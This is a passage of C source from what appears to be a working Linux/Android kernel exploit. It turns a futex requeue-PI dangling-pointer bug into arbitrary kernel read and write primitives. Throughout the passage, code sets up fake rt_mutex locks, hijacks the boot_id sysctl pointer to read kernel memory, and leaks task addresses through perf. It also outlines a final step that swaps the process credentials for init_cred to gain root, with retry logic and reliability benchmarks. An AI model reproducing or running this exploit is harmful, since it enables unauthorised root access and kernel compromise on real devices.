      syscall(SYS_pselect6, 1024, NULL, NULL, NULL, NULL, NULL);
  atomic_store(&carrier_park_result, park_result < 0 ? errno : 0);
  park_carrier_after_trigger();
  return NULL; /* unreachable */
}

static void *slide_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  /* Thread-level nice=10: a process-wide setpriority() would also change the
     waiter, making both prios equal and letting rt_mutex_waiter_equal() exit
     early (requeue then succeeds cleanly, no -EDEADLK, no dangling pointer). */
  {
    struct local_sched_attr oattr;
    memset(&oattr, 0, sizeof(oattr));
    oattr.size = sizeof(oattr);
    oattr.sched_policy = SCHED_OTHER;
    oattr.sched_nice = 10;
    errno = 0;
    long nr = syscall(SYS_sched_setattr, (int)syscall(SYS_gettid), &oattr, 0);
    if (nr != 0) {
      pr_warning("slide owner sched_setattr nice=10 errno=%d\n", errno);
    }
  }

  if (g_opts.probe_cycle) {
    __atomic_store_n(&f_pi_target, (uint32_t)syscall(SYS_gettid),
                     __ATOMIC_RELEASE);
  } else {
    errno = 0;
    long lr1 = futex_op(&f_pi_target, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                        0, NULL, NULL, 0);
    if (lr1 != 0) {
      pr_warning("slide owner LOCK_PI(target) errno=%d\n", errno);
    }
  }

  while (!atomic_load(&waiter_ready)) {
    sched_yield();
  }

  atomic_store(&owner_started, 1);
  errno = 0;
  long lr2 = futex_op(&f_pi_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                      0, NULL, NULL, 0); /* blocks: chain held by the waiter */
  if (lr2 != 0) {
    pr_warning("slide owner LOCK_PI(chain) errno=%d\n", errno);
  }

  for (;;) {
    sleep(1);
  }
  return NULL; /* unreachable */
}

static int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

/* Read a random_table UUID file: the kernel renders the 16 bytes at the
 * ctl_table .data pointer as a UUID string.
 *
 * proc_do_uuid() regenerates the whole 16-byte buffer whenever byte 8 of the
 * pointed-to memory is zero (and thereby rewrites it), so kept tests must
 * keep that byte nonzero -- see the write/read specs below. */
static int slide_read_uuid_path(const char *path, const char *name,
                                unsigned char raw[16]) {
  char text[64];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide %s open failed errno=%d\n", name, errno);
    return 0;
  }
  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("slide %s read failed errno=%d\n", name, saved_errno);
    return 0;
  }
  text[n] = 0;

  int high = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int value = hex_value(text[i]);
    if (value < 0) {
      continue;
    }
    if (high < 0) {
      high = value;
      continue;
    }
    raw[out++] = (unsigned char)((high << 4) | value);
    high = -1;
  }
  if (out != 16) {
    pr_warning("slide %s parse failed bytes=%d ret=%zd\n", name, out, n);
    return 0;
  }
  return 1;
}

static int slide_read_bootid(unsigned char raw[16]) {
  return slide_read_uuid_path("/proc/sys/kernel/random/boot_id", "boot_id",
                              raw);
}

static int slide_read_uuid(unsigned char raw[16]) {
  return slide_read_uuid_path("/proc/sys/kernel/random/uuid", "uuid", raw);
}

/* Verify one test's outcome from the boot_id readback (lo/hi = first/second
 * 8 bytes of the 16 bytes at the data pointer). */
static int slide_check_result(const struct write_test *t) {
  unsigned char raw[16];
  int read_ok = t->check_uuid ? slide_read_uuid(raw) : slide_read_bootid(raw);
  if (!read_ok) {
    return 0;
  }
  uint64_t lo = 0;
  uint64_t hi = 0;
  memcpy(&lo, raw, sizeof(lo));
  memcpy(&hi, raw + 8, sizeof(hi));
  uint64_t expected_hi = t->exp_hi;
  int ok = 1;
  if (t->check_lo && lo != t->exp_lo) {
    ok = 0;
  }
  if (t->check_hi && hi != expected_hi) {
    ok = 0;
  }
  pr_success("slide %s boot_id raw=%02x%02x%02x%02x%02x%02x%02x%02x"
             "%02x%02x%02x%02x%02x%02x%02x%02x lo=%016llx hi=%016llx "
             "exp_lo=%016llx exp_hi=%016llx ok=%d\n",
             t->name,
             raw[0], raw[1], raw[2], raw[3], raw[4], raw[5], raw[6], raw[7],
             raw[8], raw[9], raw[10], raw[11], raw[12], raw[13], raw[14],
             raw[15], (unsigned long long)lo, (unsigned long long)hi,
             (unsigned long long)t->exp_lo, (unsigned long long)expected_hi,
             ok);
  return ok;
}

static int slide_child_test(void) {
  atomic_store(&carrier_failed, 0);
  atomic_store(&carrier_done, 0);
  atomic_store(&carrier_park_result, -1);
  atomic_store(&trigger_started, 0);
  atomic_store(&trigger_finished, 0);
  pthread_t waiter;
  pthread_t owner;
  if (pthread_create(&waiter, NULL, slide_waiter_thread, NULL) != 0) {
    pr_warning("slide pthread_create(waiter) errno=%d\n", errno);
    return 0;
  }
  if (pthread_create(&owner, NULL, slide_owner_thread, NULL) != 0) {
    pr_warning("slide pthread_create(owner) errno=%d\n", errno);
    return 0;
  }

  unsigned long guard = 0;
  while ((!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) &&
         guard++ < 20000) {
    usleep(1000);
  }

  /* Give the owner time to actually block on the chain futex (it sets
     owner_started and THEN calls FUTEX_LOCK_PI).  If CMP_REQUEUE_PI fires in
     between, the walk sees an unblocked owner, the requeue succeeds and no
     dangling pointer is created. */
  usleep((useconds_t)g_opts.requeue_ms * 1000);

  errno = 0;
  dbg[10] = (uint64_t)__atomic_load_n(&f_wait, __ATOMIC_RELAXED);
  int remove_waiter_probe =
      g_opts.fake_lock_probed && perf_remove_waiter_probe_begin();
  dbg[0] = (uint64_t)futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                              1, (void *)1, &f_pi_target, 0);
  dbg[1] = (uint64_t)(uint32_t)errno;
  dbg[11] = (uint64_t)__atomic_load_n(&f_wait, __ATOMIC_RELAXED);
  if (remove_waiter_probe) {
    uint64_t probed_waiter = perf_remove_waiter_probe_end();
    if (probed_waiter) {
      __atomic_store_n(&waiter_abs, probed_waiter, __ATOMIC_RELEASE);
      pr_info_sync("slide remove_waiter probe waiter=%016llx\n",
                   (unsigned long long)probed_waiter);
    } else {
      pr_warning("slide remove_waiter probe missed\n");
    }
  }
  int wake_tid = atomic_load(&waiter_tid);
  if (!g_opts.no_early_signal && dbg[0] == (uint64_t)-1 &&
      dbg[1] == EDEADLK) {
    (void)syscall(SYS_tgkill, getpid(), wake_tid, SLIDE_EARLY_WAKE_SIGNAL);
  }

  pr_info_sync("slide child requeue ret=%lld errno=%u\n",
               (long long)(int64_t)dbg[0], (unsigned)dbg[1]);

  while (!atomic_load(&carrier_done)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (!atomic_load(&carrier_done) || atomic_load(&carrier_failed)) {
    pr_warning("slide carrier unavailable (failed=%d done=%d)\n",
               atomic_load(&carrier_failed), atomic_load(&carrier_done));
    return 0;
  }

  if (g_opts.select_carrier) {
    int select_result = atomic_load(&carrier_park_result);
    pr_info_sync("slide select carrier result=%d\n", select_result);
    if (select_result < 0) {
      pr_error("slide select carrier failed\n");
      return 0;
    }
  }

  if (!g_opts.spin_park && !g_opts.select_carrier) {
    /* Give the carrier thread time to enter the blocking pselect6 park. */
    usleep(20000);
    int park_result = atomic_load(&carrier_park_result);
    pr_info_sync("slide carrier park result=%d (want -1)\n", park_result);
    if (park_result != -1) {
      pr_error("slide carrier did not stay parked\n");
      return 0;
    }
  }

  if (!g_opts.noconsume) {
    int tid = atomic_load(&waiter_tid);
    /* No logging or alive-check syscall may run between the carrier and the
       trigger: either can give the waiter CPU a chance to be preempted. */
    if (!g_opts.self_trigger && atomic_exchange(&trigger_started, 1)) {
      pr_warning("slide trigger already fired; refusing second walk\n");
      return 0;
    }
    if (!g_opts.self_trigger && !g_opts.spin_park &&
        !g_opts.select_carrier) {
      (void)syscall(SYS_tgkill, getpid(), tid, 0);
      pr_info_sync("slide child triggering tid=%d\n", tid);
    }
    if (g_opts.self_trigger) {
      while (!atomic_load(&trigger_finished)) {
        __asm__ volatile("yield" ::: "memory");
      }
    } else {
      errno = 0;
      dbg[2] = (uint64_t)sched_setattr_tid(tid, SLIDE_TRIGGER_NICE);
      dbg[7] = (uint64_t)(uint32_t)errno;
      atomic_store(&trigger_finished, 1);
    }
    pr_info_sync("slide child carrier_done=%d trigger tid=%d ret=%lld errno=%u "
                 "fired=%d\n",
                 (int)atomic_load(&carrier_done), tid,
                 (long long)(int64_t)dbg[2], (unsigned)dbg[7],
                 atomic_load(&trigger_started));
    if (dbg[2] != 0) {
      pr_warning("slide trigger sched_setattr ret=%lld errno=%u\n",
                 (long long)dbg[2], (unsigned)dbg[7]);
    }
  }

  usleep(20000);
  return slide_check_result(cur_test);
}

/* Run a spec's attempts: each attempt forks a child (the dangling pointer only
 * survives one consumer walk per process) which reports over a pipe. */
#ifdef GHOSTLOCK_THREAD_ATTEMPTS
struct thread_attempt_result {
  atomic_int done;
  uint64_t values[20];
};

static void *run_thread_attempt(void *opaque_result) {
  struct thread_attempt_result *result =
      (struct thread_attempt_result *)opaque_result;
  disable_rseq_for_thread();
  log_slide_child_context();
  uint64_t ok = (uint64_t)slide_child_test();
  result->values[0] = ok;
  result->values[1] = write_value;
  result->values[2] = write_target;
  result->values[3] = dbg[0];
  result->values[4] = dbg[1];
  result->values[5] = dbg[2];
  result->values[6] = dbg[7];
  result->values[7] = dbg[3];
  result->values[8] = dbg[4];
  result->values[9] = dbg[5];
  result->values[10] = dbg[6];
  result->values[11] = dbg[8];
  result->values[12] = dbg[9];
  result->values[13] = dbg[10];
  result->values[14] = dbg[11];
  result->values[15] = dbg[12];
  result->values[16] = dbg[13];
  result->values[17] = dbg[14];
  result->values[18] = dbg[15];
  atomic_store(&result->done, 1);

  /*
   * Do not exit: the thread owns the cleaned waiter stack and must never run
   * the exit-time walk over the stale PI overlay.
   */
  for (;;) {
    pause();
  }
}

static int run_spec_thread_attempts(void) {
  int attempts = g_opts.attempts > 0 ? g_opts.attempts : 1;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    struct thread_attempt_result *result =
        calloc(1, sizeof(*result));
    if (!result) {
      pr_warning("slide thread attempt allocation failed\n");
      return 0;
    }

    pthread_t attempt_thread;
    if (pthread_create(&attempt_thread, NULL, run_thread_attempt, result)) {
      free(result);
      pr_warning("slide attempt pthread_create failed\n");
      return 0;
    }

    while (!atomic_load(&result->done)) {
      sched_yield();
    }

    uint64_t success = result->values[0];
    pr_info("slide thread attempt %d ok=%llu requeue=%lld/%llu "
            "trigger=%lld/%llu wait=%lld/%llu carrier=%lld/%llu\n",
            attempt, (unsigned long long)success,
            (long long)result->values[3],
            (unsigned long long)result->values[4],
            (long long)result->values[5],
            (unsigned long long)result->values[6],
            (long long)result->values[7],
            (unsigned long long)result->values[8],
            (long long)result->values[9],
            (unsigned long long)result->values[10]);
    if (success) {
      pr_info("slide attempt thread left parked\n");
      return 1;
    }
  }
  return 0;
}
#endif

static int run_spec_attempts(void) {
#ifdef GHOSTLOCK_THREAD_ATTEMPTS
  return run_spec_thread_attempts();
#else
  int attempts = g_opts.attempts > 0 ? g_opts.attempts : 1;
  if ((g_opts.fake_lock_window || g_opts.fake_lock_probed) &&
      (g_opts.fake_lock_addr || g_opts.fake_lock_empty_zero)) {
    pr_error("slide stack fake-lock mode conflicts with another fake-lock mode\n");
    return 0;
  }
  if (g_opts.fake_lock_window && g_opts.fake_lock_probed) {
    pr_error("slide --fake-lock-window conflicts with --fake-lock-probed\n");
    return 0;
  }
  if (g_opts.fake_lock_addr && g_opts.fake_lock_empty_zero) {
    pr_error("slide --fake-lock-addr conflicts with --fake-lock-empty-zero\n");
    return 0;
  }
  uint64_t fake_lock_base = canon_addr(GOT_FAKE_LOCK_BSS_IMAGE);
  if (g_opts.fake_lock_empty_zero) {
    fake_lock_base = canon_addr(SLIDE_EMPTY_ZERO_PAGE_IMAGE);
    pr_info("slide fake-lock mode=empty_zero base=%016llx slots=%d\n",
            (unsigned long long)fake_lock_base, SLIDE_LOCK_SLOTS);
  } else if (g_opts.fake_lock_addr) {
    fake_lock_base = g_opts.fake_lock_addr;
    pr_info("slide fake-lock override=%016llx slots=%d stride=%#llx\n",
            (unsigned long long)fake_lock_base, SLIDE_LOCK_SLOTS,
            (unsigned long long)SLIDE_LOCK_STRIDE);
  }

  for (int attempt = 1; attempt <= attempts; attempt++) {
    /* One fresh fake-rt_mutex slot per walk (see slide.c header).  The walk
       leaves waiters.root/leftmost pointing at the consumed waiter, so a slot
       cannot be reused; when the pool is gone, stop instead of wrapping into
       a dirty slot (that trips BUG_ON(w->lock != lock) inside the walk). */
    int slot = 0;
    cur_lock = 0;
    waiter_abs = 0;
    waiter_task = 0;
    if (!g_opts.fake_lock_window && !g_opts.fake_lock_probed) {
      slot = lock_slot_alloc();
      if (slot < 0) {
        pr_warning("slide: fake-lock slots exhausted (%d used); reboot resets "
                   "the pool\n", SLIDE_LOCK_SLOTS);
        return 0;
      }
      cur_lock = fake_lock_base +
                 (uint64_t)slot * SLIDE_LOCK_STRIDE;
    } else if (g_opts.fake_lock_window) {
      pr_info("slide fake-lock mode=window (waiter leak required)\n");
    } else {
      pr_info("slide fake-lock mode=probed (waiter SP + stack lock)\n");
    }

    int fds[2];
    if (pipe(fds) != 0) {
      pr_warning("slide pipe failed errno=%d\n", errno);
      return 0;
    }
    if (!move_fd_high(&fds[0], 500) || !move_fd_high(&fds[1], 500)) {
      pr_warning("slide result pipe high-fd move failed errno=%d\n", errno);
      close(fds[0]);
      close(fds[1]);
      return 0;
    }

    pid_t child = fork();
    if (child < 0) {
      pr_warning("slide fork failed errno=%d\n", errno);
      close(fds[0]);
      close(fds[1]);
      continue;
    }

    if (child == 0) {
      close(fds[0]);
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t ok = (uint64_t)slide_child_test();
      uint64_t out[20] = {
          ok, write_value, write_target,
          dbg[0], dbg[1], dbg[2], dbg[7], dbg[3], dbg[4], dbg[5], dbg[6],
          dbg[8], dbg[9], dbg[10], dbg[11],
          dbg[12], dbg[13], dbg[14], dbg[15], 0 };
      (void)write(fds[1], out, sizeof(out));
      /* Detach from the adb/shell session so its teardown cannot SIGCONT+SIGHUP
         this process into the exit-time walk (which reads the dangling overlay
         and soft-locks/panics the kernel). */
      if (g_opts.hold || g_opts.detach) {
        (void)setsid();
        signal(SIGHUP, SIG_IGN);
      }
      if (g_opts.detach) {
        pr_info_sync(
            "slide child DETACH pid=%d (alive forever, no exit walk)\n",
            getpid());
        fflush(NULL);
        close(0);
        close(1);
        close(2);
        for (;;) {
          pause();
        }
      }
      /* HOLD: self-stop instead of exiting; exiting runs
         futex_exit_release -> rt_mutex_adjust_pi on the waiter, whose
         pi_blocked_on still dangles into (possibly clobbered) stack memory,
         which can panic the device.  A stopped process cannot exit. */
      if (g_opts.hold) {
        pr_info("slide child HOLD pid=%d (SIGSTOP, no exit walk)\n", getpid());
        fflush(NULL);
        raise(SIGSTOP);
        _exit(0);
      }
      _exit(ok ? 0 : 1);
    }

    close(fds[1]);
    if (g_opts.fire_and_forget) {
      close(fds[0]);
      sleep((unsigned)g_opts.wait_seconds + 2);
      return 1;
    }
    struct pollfd pf = { .fd = fds[0], .events = POLLIN };
    /* Attempts that hit a clobbered carrier hang in the kernel walk (see
       header); bound the wait so the next attempt can retry.  A good attempt
       finishes in ~(wait_seconds + 0.5)s. */
    int timeout_seconds = g_opts.wait_seconds * 2 + 8;
    if (g_opts.fake_lock_window) {
      timeout_seconds += g_opts.leak_timeout_seconds;
    }
    int timeout_ms = timeout_seconds * 1000;
    if (poll(&pf, 1, timeout_ms) <= 0) {
      pr_warning("slide attempt %d timed out waiting for child\n", attempt);
      write_path_failed = 1;
      if (g_opts.detach) {
        pr_info_sync(
            "slide attempt %d DETACH timeout child=%d left alive\n",
            attempt, child);
        close(fds[0]);
        return 0;
      }
      if (g_opts.hold) {
        /* SIGKILL here would run the exit-time walk on the dangling pointer;
           SIGSTOP instead (a stopped process cannot exit). */
        pr_info("slide attempt %d HOLD timeout child=%d -> SIGSTOP\n",
                attempt, child);
        kill(child, SIGSTOP);
        waitpid(child, NULL, WUNTRACED);
        close(fds[0]);
        return 0;
      }
      kill(child, SIGKILL);
      waitpid(child, NULL, 0);
      close(fds[0]);
      continue;
    }

    uint64_t out[20] = { 0 };
    ssize_t n = read(fds[0], out, sizeof(out));
    close(fds[0]);
    int success = n == (ssize_t)sizeof(out) && out[0] != 0;
    if (success && cur_test && cur_test->dynamic_fake_security) {
      slide_fake_security_addr = out[1];
    }
    if (success && cur_test && cur_test->dynamic_fake_avc_node) {
      slide_fake_avc_node_addr = out[1];
    }
    pr_info("slide %s attempt %d ok=%d value=%016llx target=%016llx "
            "requeue=%lld/%u trigger=%lld/%u wait=%lld/%u carrier=%lld/%u "
            "fwait=%#x->%#x cmp=%#x->%#x sig=%llu/%lld/%u/%u\n",
            cur_test->name, attempt, success, (unsigned long long)out[1],
            (unsigned long long)out[2], (long long)(int64_t)out[3],
            (unsigned)out[4], (long long)(int64_t)out[5], (unsigned)out[6],
            (long long)(int64_t)out[7], (unsigned)out[8],
            (long long)(int64_t)out[9], (unsigned)out[10],
            (unsigned)out[11], (unsigned)out[12],
            (unsigned)out[13], (unsigned)out[14],
            (unsigned long long)out[15], (long long)(int64_t)out[16],
            (unsigned)out[17], (unsigned)out[18]);

    if (g_opts.detach) {
      pr_info_sync("slide attempt %d DETACH child=%d left alive\n", attempt,
                   child);
      return success;
    }
    if (g_opts.hold) {
      /* The child self-stops after reporting, but another owner thread can run
       * during that tiny window and walk the consumed fake lock again.  Stop
       * the whole child before doing any logging or other userspace work. */
      kill(child, SIGSTOP);
      waitpid(child, NULL, WUNTRACED);
      pr_info("slide attempt %d HOLD child=%d stopped before cleanup\n",
              attempt, child);
      return success;
    }

    /* Reap with a bound: a hung child must not burn the whole attempt
       budget. */
    int status = 0;
    for (int w = 0; w < 40 && waitpid(child, &status, WNOHANG) == 0; w++) {
      usleep(50000);
    }
    if (waitpid(child, &status, WNOHANG) == 0) {
      kill(child, SIGKILL);
      waitpid(child, &status, 0);
    }
    if (success) {
      return 1;
    }
  }
  return 0;
#endif
}

static int run_spec(const struct write_test *t) {
  if (write_path_failed) {
    pr_warning("slide: write path stopped after a prior timeout\n");
    return 0;
  }
  write_value = t->value;
  write_target = t->target;
  cur_shape = t->shape;
  cur_test = t;
  pr_info("slide %s test: shape=%s value=%016llx target=%016llx, "
          "MCAST opt 43 (0x%x bytes) waiter_off=%#llx, %d attempt(s), "
          "wait=%ds requeue=%dms rt_prio=%d probe_cycle=%d\n",
          t->name,
          t->shape == SHAPE_NOOP ? "noop"
                                 : (t->shape == SHAPE_LEAF ? "leaf"
                                                           : "pointer"),
          (unsigned long long)t->value, (unsigned long long)t->target,
          MCAST_OPT_LEN, (unsigned long long)g_opts.mcast_waiter_off,
          g_opts.attempts > 0 ? g_opts.attempts : 1,
          g_opts.wait_seconds, g_opts.requeue_ms, g_opts.rt_prio,
          g_opts.probe_cycle);
  int ok = run_spec_attempts();
  pr_success("slide %s test %s\n", t->name, ok ? "PASSED" : "FAILED");
  return ok;
}

int slide_run_write_test(void) {
  uint64_t fake_lock_base = g_opts.fake_lock_addr
                                ? g_opts.fake_lock_addr
                                : canon_addr(GOT_FAKE_LOCK_BSS_IMAGE);
  uint64_t safe_value =
      fake_lock_base + SLIDE_LOCK_SLOTS * SLIDE_LOCK_STRIDE;
  struct write_test t = {
    .name = "write",
    .shape = SHAPE_POINTER,
    .value = safe_value,
    /* +8: proc_do_uuid() regenerates the UUID when bootid[8] == 0 (see
       slide_read_bootid), so verify via the high half; the loggers pointer
       keeps byte 8 = 0x20. */
    .target = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE) + 8,
    .check_hi = 1,
    .exp_hi = safe_value,
  };
  return run_spec(&t);
}

int slide_run_leaf_test(void) {
  /* The leaf shape must produce a clean zero store: *(base) := 0.  Reading a
     location that is already zero proves nothing, so seed the low half with a
     non-zero pointer first, verify it, then zero it and verify again.  The
     high half is seeded too: proc_do_uuid() regenerates the UUID when
     bootid[8] == 0, which would overwrite the value under test. */
  const uint64_t base = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);
  const uint64_t val = canon_addr(SLIDE_LOGGERS_0_1_IMAGE);
  unsigned char raw[16];
  uint64_t got = 0;
  int ok = 1;

  struct write_test seed_hi = {
    .name = "leaf-seed-hi", .shape = SHAPE_POINTER, .value = val,
    .target = base + 8,
  };
  struct write_test seed_lo = {
    .name = "leaf-seed-lo", .shape = SHAPE_POINTER, .value = val,
    .target = base,
  };
  ok &= run_spec(&seed_hi);
  ok &= run_spec(&seed_lo);
  if (slide_read_bootid(raw)) {
    memcpy(&got, raw, sizeof(got));
  }
  int seeded = (got == val);
  pr_info("leaf: seeded low=%016llx exp=%016llx %s\n",
          (unsigned long long)got, (unsigned long long)val,
          seeded ? "ok" : "MISMATCH");
  ok &= seeded;

  struct write_test t = {
    .name = "leaf",
    .shape = SHAPE_LEAF,
    .target = base,
    .check_lo = 1,
    .exp_lo = 0,
  };
  ok &= run_spec(&t);
  pr_success("slide leaf test %s\n", ok ? "PASSED" : "FAILED");
  return ok;
}

static int run_restore_spec(uint64_t exp_lo) {
  /* Point the boot_id ctl_table .data field back at sysctl_bootid so that
     /proc/sys/kernel/random/boot_id reads its own buffer again.  The
     __rb_change_child side effect stores the .data slot address at
     bootid+8, hence the expected high half. */
  struct write_test t = {
    .name = "restore",
    .shape = SHAPE_POINTER,
    .value = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE),
    .target = canon_addr(SLIDE_BOOTID_CTL_DF_IMAGE),
    .check_lo = 1,
    .check_hi = 1,
    .exp_lo = exp_lo,
    .exp_hi = canon_addr(SLIDE_BOOTID_CTL_DF_IMAGE),
  };
  return run_spec(&t);
}

int slide_run_read_test(void) {
  /* Capture the current boot_id buffer first: after the restore the low half
     must read back unchanged. */
  unsigned char raw0[16];
  uint64_t lo0 = 0;
  int have0 = slide_read_bootid(raw0);
  if (have0) {
    memcpy(&lo0, raw0, sizeof(lo0));
  }

  /* Read primitive: redirect .data to the boot_id ctl_table entry + 0x10
     (maxlen=16, mode=0444 -> a known constant) and read the file back; the
     side effect then stores the .data slot address at entry+0x18, so the
     high half is known too.  A+8 must not overlap the .data field (A !=
     entry+0) or the side effect would undo the redirect. */
  struct write_test r = {
    .name = "read",
    .shape = SHAPE_POINTER,
    .value = canon_addr(SLIDE_BOOTID_CTL_ENTRY_IMAGE) + 0x10,
    .target = canon_addr(SLIDE_BOOTID_CTL_DF_IMAGE),
    .check_lo = 1,
    .check_hi = 1,
    .exp_lo = 0x0000012400000010ULL, /* maxlen=16, mode=0444 */
    .exp_hi = canon_addr(SLIDE_BOOTID_CTL_DF_IMAGE),
  };
  int ok = run_spec(&r);
  ok &= run_restore_spec(have0 ? lo0 : 0);
  return ok;
}

int slide_run_uuid_test(void) {
  const uint64_t uuid_entry = canon_addr(SLIDE_UUID_CTL_ENTRY_IMAGE);
  const uint64_t uuid_data_field = canon_addr(SLIDE_UUID_CTL_DF_IMAGE);
  struct write_test redirect = {
    .name = "uuid-read",
    .shape = SHAPE_POINTER,
    .check_uuid = 1,
    .value = uuid_entry + 0x10,
    .target = uuid_data_field,
    .check_lo = 1,
    .check_hi = 1,
    .exp_lo = 0x0000012400000010ULL,
    .exp_hi = uuid_data_field,
  };
  int ok = run_spec(&redirect);

  struct write_test restore = {
    .name = "uuid-restore",
    .shape = SHAPE_LEAF,
    .check_uuid = 1,
    .target = uuid_data_field,
  };
  ok &= run_spec(&restore);
  pr_success("slide uuid test %s\n", ok ? "PASSED" : "FAILED");
  return ok;
}

int slide_run_safe_test(void) {
  uint64_t safe_page = g_opts.fake_lock_addr
                           ? g_opts.fake_lock_addr
                           : canon_addr(GOT_FAKE_LOCK_BSS_IMAGE);
  uint64_t safe_target = safe_page + 0x800;
  uint64_t safe_value = safe_page + 0x808;

  struct write_test noop = {
    .name = "safe-noop",
    .shape = SHAPE_NOOP,
  };
  struct write_test leaf = {
    .name = "safe-leaf",
    .shape = SHAPE_LEAF,
    .target = safe_target,
  };
  struct write_test pointer = {
    .name = "safe-pointer",
    .shape = SHAPE_POINTER,
    .value = safe_value,
    .target = safe_target,
  };

  int ok = 1;
  if (!g_opts.safe_leaf_only && !g_opts.safe_pointer_only) {
    ok &= run_spec(&noop);
  }
  if (!g_opts.safe_pointer_only) {
    ok &= run_spec(&leaf);
  }
  if (!g_opts.safe_leaf_only) {
    ok &= run_spec(&pointer);
  }
  pr_success("slide safe consumer test %s (page=%016llx target=%016llx "
             "value=%016llx)\n",
             ok ? "PASSED" : "FAILED", (unsigned long long)safe_page,
             (unsigned long long)safe_target,
             (unsigned long long)safe_value);
  return ok;
}

int slide_run_leak_task(void) {
  uint64_t task = 0;
  for (int round = 0; round < g_opts.task_rounds; round++) {
    task = perf_leak_task();
    if (task) {
      break;
    }
    pr_warning("leak-task round %d/%d missed\n", round + 1,
               g_opts.task_rounds);
  }
  if (!task) {
    pr_warning("leak-task: no current task candidate\n");
    return 0;
  }
  for (int i = 0; i < perf_task_ncand; i++) {
    pr_info("leak-task candidate[%d]=%016llx n=%u\n", i,
            (unsigned long long)perf_task_cand[i], perf_task_cnt[i]);
  }
  pr_success("leak-task best=%016llx\n", (unsigned long long)task);
  return 1;
}

static int slide_read8(uint64_t addr, uint64_t *out);
static int slide_comm_matches(uint64_t kernel_comm, const char *comm);

int slide_run_leak_task_pid(int target_pid) {
  uint64_t task = perf_leak_task_pid((pid_t)target_pid);
  if (!task) {
    pr_warning("leak-task-pid %d: no task candidates\n", target_pid);
    return 0;
  }
  if (g_opts.target_domain_comm && g_opts.target_domain_comm[0]) {
    for (int index = 0; index < perf_task_ncand; index++) {
      uint64_t candidate = perf_task_cand[index];
      uint64_t comm = 0;
      if (slide_read8(candidate + SLIDE_TASK_COMM_OFF, &comm) &&
          slide_comm_matches(comm, g_opts.target_domain_comm)) {
        pr_success("leak-task-pid %d match=%016llx comm=%016llx expected=%s\n",
                   target_pid, (unsigned long long)candidate,
                   (unsigned long long)comm, g_opts.target_domain_comm);
        return 1;
      }
    }
    pr_warning("leak-task-pid %d: no candidate matched comm=%s\n",
               target_pid, g_opts.target_domain_comm);
    return 0;
  }
  for (int index = 0; index < perf_task_ncand; index++) {
    pr_info("leak-task-pid %d candidate[%d]=%016llx n=%u\n",
            target_pid, index,
            (unsigned long long)perf_task_cand[index],
            perf_task_cnt[index]);
  }
  pr_success("leak-task-pid %d best=%016llx\n",
             target_pid, (unsigned long long)task);
  return 1;
}

int slide_run_read8(uint64_t target) {
  uint64_t value = 0;
  if (!slide_read8(target, &value)) {
    pr_warning("read8 %016llx failed\n", (unsigned long long)target);
    return 0;
  }
  pr_success("read8 %016llx = %016llx\n",
             (unsigned long long)target,
             (unsigned long long)value);
  return 1;
}

int slide_run_verify_all(void) {
  int ok = 1;
  ok &= slide_run_write_test();
  ok &= slide_run_leaf_test();
  ok &= slide_run_read_test();
  pr_success("slide verify all %s\n", ok ? "PASSED" : "FAILED");
  return ok;
}

/* Success-rate benchmark: n independent single-attempt runs of the pointer
 * write test (each attempt forks a fresh child; one clobbered overlay must
 * not poison the next).  Used to quantify the flakiness that --attempts
 * retries paper over. */
int slide_run_bench(int n) {
  uint64_t safe_value =
      canon_addr(GOT_FAKE_LOCK_BSS_IMAGE) +
      SLIDE_LOCK_SLOTS * SLIDE_LOCK_STRIDE;
  struct write_test t = {
    .name = "bench-write",
    .shape = SHAPE_POINTER,
    .value = safe_value,
    .target = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE) + 8,
    .check_hi = 1,
    .exp_hi = safe_value,
  };
  int saved = g_opts.attempts;
  g_opts.attempts = 1;
  int ok = 0;
  for (int i = 1; i <= n; i++) {
    int r = run_spec(&t);
    ok += r;
    pr_info("bench: run %d/%d %s (total ok=%d)\n", i, n, r ? "ok" : "FAIL", ok);
  }
  g_opts.attempts = saved;
  pr_success("bench: %d/%d single-attempt writes succeeded (%d%%)\n", ok, n,
             n ? (100 * ok) / n : 0);
  return ok > 0;
}

/* Endgame (the mrx-w09 flow): point our task's real_cred/cred at init_cred
 * with the pointer shape and prove uid 0 in this process.  The rb_erase side
 * effect stores `target` at value+8 -> init_cred.gid, so a successful hit is
 * followed by a leaf zero write repairing init_cred+8.  Task candidates come
 * from the perf __schedule leak; those samples can also fire for prev/next,
 * so each candidate's comm is verified through the read primitive before any
 * cred write (the read's own side effect clobbers comm[8..16], cosmetic). */

/* 16-byte arbitrary kernel read through the boot_id ctl_table.  The UUID
 * entry's .data field sits at a page boundary, so its pointer shape can fault
 * while the rt_mutex tree walk reads target+0x38.  boot_id's .data field has
 * a mapped UUID entry at that offset.  The pointer is restored explicitly
 * after each read. */
static int slide_read_bytes16(uint64_t addr, unsigned char out[16]) {
  const uint64_t bootid_data_field = canon_addr(SLIDE_BOOTID_CTL_DF_IMAGE);
  for (int attempt = 1; attempt <= 3; attempt++) {
    unsigned char raw[16];
    struct write_test redirect = {
      .name = "read8",
      .shape = SHAPE_POINTER,
      .value = addr,
      .target = bootid_data_field,
    };
    int wrote = run_spec(&redirect);
    int read_ok = wrote && slide_read_bootid(raw);

    struct write_test restore = {
      .name = "restore-bootid-data-read8",
      .shape = SHAPE_POINTER,
      .value = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE),
      .target = bootid_data_field,
    };
    if (!run_spec(&restore)) {
